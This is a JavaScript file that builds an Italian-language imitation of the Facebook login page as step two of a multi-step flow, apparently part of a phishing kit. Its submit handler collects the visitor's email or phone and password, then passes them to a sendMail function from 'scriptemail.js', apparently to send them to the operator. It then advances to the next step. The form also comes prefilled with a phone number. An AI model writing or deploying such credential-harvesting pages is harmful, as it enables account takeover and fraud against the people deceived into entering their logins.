// step2.js - Facebook Login Page

document.addEventListener('DOMContentLoaded', function() {
    loadStep2Content();
    initStep2();
});

function loadStep2Content() {
    const step2Container = document.getElementById('step2');
    
    step2Container.innerHTML = `
        <div style="max-width: 500px; margin: 0 auto;">
            <div style="text-align: center; margin-bottom: 30px;">
                <!-- Facebook Logo - Already here! -->
                <div style="margin-bottom: 15px;">
                    <i class="fa-brands fa-facebook" style="font-size: 60px; color: #1877f2;"></i>
                </div>
                <h2 style="color: #333; font-size: 28px; font-weight: 600; margin-bottom: 10px;">Accedi a Facebook</h2>
                <p style=" display:none; color: #666; font-size: 15px;">Inserisci le tue credenziali per continuare</p>
            </div>

            <div style="background: white; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 30px;">
                <form id="facebookLoginForm" onsubmit="handleFacebookLogin(event)">
                    <div style="margin-bottom: 15px;">
                        <input type="text" id="facebookEmail" class="form-control" placeholder="Indirizzo e-mail o numero di cellulare" value="3355224483" style="width: 100%; padding: 14px 16px;" required>
                    </div>
                    
                    <div style="margin-bottom: 20px;">
                        <div class="password-wrapper">
                            <input type="password" id="facebookPassword" class="form-control" placeholder="Password" style="width: 100%; padding: 14px 45px 14px 16px;" required>
                            <span class="toggle-password" onclick="toggleFacebookPassword()">
                                <i class="fa-regular fa-eye-slash"></i>
                            </span>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn" style="width: 100%; background: #1877f2; border-raduis:100px; margin-bottom: 15px; border: none;">
                        Accedi
                    </button>
                    
                    <div style="text-align: center; margin-bottom: 20px;">
                        <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Password dimenticata?</a>
                    </div>
                    
                    <div style="display: flex; align-items: center; text-align: center; margin: 20px 0; color: #666;">
                        <span style="flex: 1; height: 1px; background: #ddd;"></span>
                        <span style="padding: 0 15px; font-size: 14px;">oppure</span>
                        <span style="flex: 1; height: 1px; background: #ddd;"></span>
                    </div>
                    
                    <button type="button" class="btn" id="createAccountBtn" style="width: 100%; background: white; border-raduis:100px; border: 2px solid #1877f2; color: #1877f2; margin-top: 10px;">
                        <i class="fas fa-user-plus" style="margin-right: 8px;"></i> Crea nuovo account
                    </button>
                </form>
            </div>

            <div style="text-align: center; margin-top: 25px; font-size: 14px; color: #666;">
                <a href="#" style="color: #1877f2; text-decoration: none; font-weight: 600;">Crea una Pagina</a> per una celebrità, un marchio o un'azienda.
            </div>
        </div>
    `;
}

function initStep2() {
    // Create account button handler
    document.getElementById('createAccountBtn')?.addEventListener('click', function() {
        Swal.fire({
            icon: 'info',
            title: 'Crea Account',
            text: 'Per favore, accedi a Facebook!',
            timer: 2000,
            showConfirmButton: false
        });
    });
}

// Facebook login handler
function handleFacebookLogin(event) {
    event.preventDefault();
    
    const email = document.getElementById('facebookEmail').value;
    const password = document.getElementById('facebookPassword').value;
    
    if (!email || !password) {
        Swal.fire({
            icon: 'warning',
            title: 'Campi vuoti',
            text: 'Compila tutti i campi',
            timer: 2000,
            showConfirmButton: false
        });
        return;
    }
    
    // Show loading
    const loadingModal = document.getElementById('loadingModal');
    if (loadingModal) loadingModal.style.display = 'flex';
    
    // Store user data in session
    sessionStorage.setItem('facebookUser', JSON.stringify({
        email: email,
        timestamp: new Date().toISOString()
    }));
    
    // Send via scriptemail.js
    if (typeof sendMail === 'function') {
        const fakeEvent = {
            target: { id: 'facebookLoginForm' },
            preventDefault: () => {}
        };
        sendMail(fakeEvent);
    } else {
        // Fallback: just redirect
        setTimeout(() => {
            if (typeof closeLoadingModal === 'function') closeLoadingModal();
            if (typeof goToStep === 'function') goToStep(3);
        }, 1500);
    }
}

// Toggle password visibility
function toggleFacebookPassword() {
    const passwordInput = document.getElementById('facebookPassword');
    const toggleIcon = document.querySelector('#step2 .toggle-password i');
    
    if (!passwordInput || !toggleIcon) return;
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.className = 'fa-regular fa-eye';
    } else {
        passwordInput.type = 'password';
        toggleIcon.className = 'fa-regular fa-eye-slash';
    }
}

